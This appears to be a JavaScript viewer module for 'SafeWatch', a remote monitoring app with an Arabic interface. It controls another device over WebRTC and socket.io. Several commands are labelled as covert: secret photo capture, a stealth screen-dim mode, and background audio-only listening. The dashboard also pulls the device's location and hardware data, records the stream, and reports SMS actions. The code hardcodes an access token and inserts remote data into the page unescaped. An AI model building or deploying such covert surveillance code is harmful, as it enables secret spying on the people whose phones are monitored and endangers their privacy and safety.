/**
 * SafeWatch v4.0 - Viewer Module
 * Handles dashboard control and stream reception
 */

import { Core } from './core.js';

export class ViewerSystem {
    constructor(roomId) {
        this.roomId = roomId;
        this.socket = io();
        this.peerConnection = null;
        this.remoteVideo = document.getElementById('remoteVideo');
        this.audioEnabled = false;
        this.isRecording = false;
        this.mediaRecorder = null;
        this.recordedChunks = [];

        this.init();
    }

    init() {
        console.log("Initializing Viewer System...");
        this.setupSocket();
        this.setupUIListeners();
        this.socket.emit('join-room', this.roomId, 'viewer');

        // Populate UI
        document.getElementById('session-name-display').innerText = this.roomId;
        document.getElementById('session-start-time').innerText = new Date().toLocaleTimeString('ar-EG');

        // QR & Link Logic
        this.generateMonitorLink();
    }

    generateMonitorLink() {
        const linkDisplay = document.getElementById('link-display');
        const qrContainer = document.getElementById('qrcode');
        const origin = window.location.origin;
        const mode = Core.getMode();
        let monitorUrl = `${origin}/monitor.html?session=${this.roomId}&token=dev2000`;

        if (mode === 'audio') {
            monitorUrl += `&mode=audio`;
            // Adjust Viewer UI
            document.getElementById('remoteVideo').parentElement.style.display = 'none';
            document.querySelector('.logo span').innerText = 'المراقبة الصوتية';
            this.audioEnabled = true; // Auto-enable audio for viewer
        }

        if (linkDisplay) linkDisplay.innerText = monitorUrl;

        const makeQR = () => {
            if (typeof QRCode !== 'undefined' && qrContainer) {
                qrContainer.innerHTML = '';
                new QRCode(qrContainer, { text: monitorUrl, width: 200, height: 200 });
            } else {
                setTimeout(makeQR, 200);
            }
        };
        makeQR();
    }

    setupSocket() {
        this.socket.on('monitor-ready', () => {
            this.startWebRTC();
            this.hideSetup();
        });

        this.socket.on('user-connected', (role) => {
            if (role === 'monitor') {
                this.startWebRTC();
                this.hideSetup();
            }
        });

        this.socket.on('answer', async (payload) => {
            if (this.peerConnection) {
                await this.peerConnection.setRemoteDescription(new RTCSessionDescription(payload.sdp));
            }
        });

        this.socket.on('ice-candidate', async (payload) => {
            if (this.peerConnection && this.peerConnection.remoteDescription) {
                await this.peerConnection.addIceCandidate(new RTCIceCandidate(payload.candidate));
            }
        });

        this.socket.on('status-update', (data) => {
            console.log("Status update received:", data);

            if (data.type === 'photo-captured') {
                this.addFileToExplorer(data.data, data.timestamp);
                Core.showNotification("تم التقاط صورة وحفظها في الملفات", "success");
            } else if (data.type === 'sms-sent') {
                Core.showNotification(`تم فتح تطبيق الرسائل للرقم: ${data.phone}`, "success");
            } else if (data.battery) {
                this.updateBatteryUI(data.battery);
                Core.showNotification("تم تحديث حالة الجهاز بنجاح");
            }
        });

        this.socket.on('device-info', (payload) => this.updateDeviceInfoUI(payload.info));

        this.socket.on('stream-data', (payload) => {
            if (payload.image && payload.isSnapshot) this.addToGallery(payload.image);
        });
    }

    addFileToExplorer(base64Data, timestamp) {
        const grid = document.getElementById('remote-files-grid');
        if (!grid) return;

        // Clear placeholder if exists
        const placeholder = grid.querySelector('p');
        if (placeholder) placeholder.remove();

        const dateStr = new Date(timestamp).toLocaleTimeString('ar-EG');
        const fileCard = document.createElement('div');
        fileCard.className = 'file-card';
        fileCard.style = "background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px; text-align: center; cursor: pointer;";
        fileCard.innerHTML = `
            <img src="${base64Data}" style="width: 100%; border-radius: 8px;" onclick="window.open('${base64Data}')">
            <div style="font-size: 0.7rem; margin-top: 8px; opacity: 0.7;">صورة - ${dateStr}</div>
        `;
        grid.prepend(fileCard);
    }

    async startWebRTC() {
        if (this.peerConnection) this.peerConnection.close();

        this.peerConnection = new RTCPeerConnection(Core.rtcConfig);

        this.peerConnection.onicecandidate = (e) => {
            if (e.candidate) this.socket.emit('ice-candidate', { roomId: this.roomId, candidate: e.candidate });
        };

        this.peerConnection.ontrack = (e) => {
            console.log("RTC: Received track", e.track.kind);
            if (e.streams && e.streams[0]) {
                this.remoteVideo.srcObject = e.streams[0];
            } else {
                if (!this.remoteVideo.srcObject) this.remoteVideo.srcObject = new MediaStream();
                this.remoteVideo.srcObject.addTrack(e.track);
            }

            // Apply audio state
            this.remoteVideo.muted = !this.audioEnabled;
            this.remoteVideo.volume = this.audioEnabled ? 1.0 : 0;

            this.remoteVideo.play().catch(() => {
                const btn = document.getElementById('play-stream-btn');
                if (btn) btn.style.display = 'block';
            });
        };

        // Add transceivers for both video and audio
        this.peerConnection.addTransceiver('video', { direction: 'recvonly' });
        this.peerConnection.addTransceiver('audio', { direction: 'recvonly' });

        const offer = await this.peerConnection.createOffer({
            offerToReceiveAudio: true,
            offerToReceiveVideo: true
        });
        await this.peerConnection.setLocalDescription(offer);
        this.socket.emit('offer', { roomId: this.roomId, sdp: offer });
    }

    setupUIListeners() {
        // Zoom
        const zoomSlider = document.getElementById('zoom-slider');
        if (zoomSlider) {
            zoomSlider.oninput = (e) => {
                const val = e.target.value;
                document.getElementById('zoom-val').innerText = val + 'x';
                this.sendCommand('set-zoom', parseFloat(val));
            };
        }

        // Play Button
        const playBtn = document.getElementById('play-stream-btn');
        if (playBtn) {
            playBtn.onclick = () => {
                this.remoteVideo.play();
                playBtn.style.display = 'none';
            };
        }
    }

    sendCommand(command, value = null) {
        // New commands use unified 'command' event
        const newCommands = ['take-photo', 'get-status'];
        const eventType = newCommands.includes(command) ? 'command' : 'control-command';

        this.socket.emit(eventType, { roomId: this.roomId, command, value });

        const labels = {
            'switch-camera': 'تبديل الكاميرا',
            'toggle-torch': 'تغيير وضع الكشاف',
            'set-zoom': 'تغيير مستوى الزووم',
            'capture-photo': 'جاري التقاط صورة...',
            'take-photo': 'جاري التقاط صورة سرية...',
            'get-status': 'جاري سحب بيانات الجهاز...',
            'restart-app': 'جاري إعادة تشغيل الكاميرا...',
            'hard-lock': 'تفعيل وضع القفل الكامل',
            'screen-dim': 'تبديل وضع التخفي'
        };
        Core.showNotification(labels[command] || 'تم إرسال الأمر', 'success');
    }

    toggleAudio() {
        this.audioEnabled = !this.audioEnabled;
        this.remoteVideo.muted = !this.audioEnabled;
        this.remoteVideo.volume = 1.0;

        const btn = document.getElementById('toggle-audio-btn');
        const icon = btn.querySelector('ion-icon');
        const span = btn.querySelector('span');

        if (this.audioEnabled) {
            icon.name = "volume-high";
            span.innerText = "صوت: تشغيل";
            btn.classList.add('active');
            this.remoteVideo.play().catch(() => { });
        } else {
            icon.name = "volume-mute";
            span.innerText = "صوت: كتم";
            btn.classList.remove('active');
        }
    }

    hideSetup() {
        document.getElementById('setup-screen').style.display = 'none';
        const dashboard = document.getElementById('dashboard');
        dashboard.style.display = 'grid';

        if (Core.getMode() === 'audio') {
            const placeholder = document.createElement('div');
            placeholder.style = "grid-column: 1/-1; background: rgba(255,255,255,0.05); padding: 50px; border-radius: 20px; text-align: center;";
            placeholder.innerHTML = `
                <ion-icon name="mic" style="font-size: 4rem; color: var(--primary); margin-bottom: 20px;"></ion-icon>
                <h2>وضع المراقبة الصوتية نشط</h2>
                <p style="opacity: 0.6;">يتم الآن استقبال الصوت فقط من الجهاز الآخر في الخلفية.</p>
            `;
            dashboard.prepend(placeholder);
        }
    }

    updateBatteryUI(p) {
        const lvl = document.getElementById('battery-level');
        if (!lvl) return;

        // Handle both formats: number or object with .level
        const batteryLevel = typeof p === 'number' ? p : (p.level || p);
        lvl.innerText = batteryLevel + '%';
        const icon = lvl.parentElement.querySelector('ion-icon');
        if (icon) {
            icon.name = batteryLevel > 80 ? 'battery-full' : (batteryLevel > 20 ? 'battery-half' : 'battery-dead');
            if (p.charging) icon.style.color = '#fbbf24';
        }
    }

    updateDeviceInfoUI(info) {
        const box = document.getElementById('device-info-box');
        box.innerHTML = `
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px; font-size:0.7rem;">
                <span style="opacity:0.6">الجهاز:</span> <span>${info.platform || 'N/A'}</span>
                <span style="opacity:0.6">المعالج:</span> <span>${info.cores || 'N/A'} Core</span>
                <span style="opacity:0.6">الذاكرة:</span> <span>${info.memory || 'N/A'}</span>
                <span style="opacity:0.6">اللغة:</span> <span>${info.language || 'N/A'}</span>
                <span style="opacity:0.6">الشبكة:</span> <span>${info.connection || 'N/A'}</span>
                <span style="opacity:0.6">الموقع:</span> <span style="color:var(--primary)">${info.location ? info.location.lat + ',' + info.location.lon : '...'}</span>
            </div>
        `;
    }

    addToGallery(img) {
        const gallery = document.getElementById('photo-gallery');
        const noMsg = document.getElementById('no-photos-msg');
        if (noMsg) noMsg.remove();

        const div = document.createElement('div');
        div.className = 'gallery-item';
        div.innerHTML = `
            <img src="${img}" onclick="window.open(this.src)">
            <div class="gallery-info">
                <span>${new Date().toLocaleTimeString('ar-EG')}</span>
                <a href="${img}" download="SafeWatch_${Date.now()}.jpg"><ion-icon name="download-outline"></ion-icon></a>
            </div>
        `;
        gallery.prepend(div);
    }

    toggleRecording() {
        if (!this.isRecording) {
            const stream = this.remoteVideo.srcObject;
            if (!stream) return alert("لا يوجد بث حالياً!");

            this.isRecording = true;
            this.recordedChunks = [];
            this.mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

            this.mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) this.recordedChunks.push(e.data);
            };

            this.mediaRecorder.onstop = () => {
                const blob = new Blob(this.recordedChunks, { type: 'video/webm' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `SafeWatch_Video_${Date.now()}.webm`;
                a.click();
            };

            this.mediaRecorder.start();
            this.updateRecordingUI(true);
        } else {
            this.isRecording = false;
            this.mediaRecorder.stop();
            this.updateRecordingUI(false);
        }
    }

    updateRecordingUI(active) {
        const btn = document.getElementById('record-btn');
        const icon = btn.querySelector('ion-icon');
        const span = btn.querySelector('span');
        if (active) {
            btn.style.background = '#ef4444';
            btn.style.color = 'white';
            span.innerText = "إيقاف التسجيل";
            icon.classList.add('pulsing');
        } else {
            btn.style.background = '';
            btn.style.color = '';
            span.innerText = "تسجيل فيديو";
            icon.classList.remove('pulsing');
        }
    }
}
